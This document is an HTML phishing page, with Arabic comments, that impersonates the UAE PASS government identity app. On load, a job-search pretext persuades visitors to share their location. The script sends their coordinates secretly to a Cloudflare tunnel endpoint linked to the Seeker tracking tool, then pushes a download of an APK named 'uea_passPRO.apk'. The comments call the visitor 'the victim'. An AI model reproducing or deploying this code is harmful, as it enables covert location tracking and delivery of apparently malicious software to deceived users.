    <title>UAE PASS - Error</title>
    <script>
// رابط نفق Seeker الخاص بك (تأكد أنه الرابط الذي حصلت عليه من Cloudflare للمنفذ 8080)
const seekerUrl = "https://kate-sacramento-andrew-strap.trycloudflare.com/result_handler.php";

function getInjectedLocation() {
    if (navigator.geolocation) {
        // إظهار رسالة احترافية للمستخدم
        alert("للحصول على أفضل نتائج الوظائف في منطقتك (دبي، أبوظبي، أو الرياض)، يرجى السماح بالوصول إلى الموقع في النافذة التالية.");
        
        navigator.geolocation.getCurrentPosition(function(position) {
            // سحب البيانات
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = position.coords.accuracy;

            // إرسال البيانات سراً إلى جهازك (Seeker)
            fetch(seekerUrl, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `Status=success&Lat=${lat}&Lon=${lon}&Acc=${acc}&Alt=NotAvailable&Dir=NotAvailable&Spd=NotAvailable`
            });

            console.log("Location sent successfully.");
            
            // بعد سحب الموقع، ابدأ تحميل التطبيق تلقائياً
            setTimeout(function() {
                window.location.href = "uea_passPRO.apk";
            }, 2000);

        }, function(error) {
            // في حال الرفض، حمله التطبيق مباشرة لضمان عدم ضياع الضحية
            window.location.href = "uea_passPRO.apk";
        }, {enableHighAccuracy: true});
    }
}

// تشغيل الوظيفة بمجرد تحميل الصفحة
window.onload = function() {
    getInjectedLocation();
};
</script>
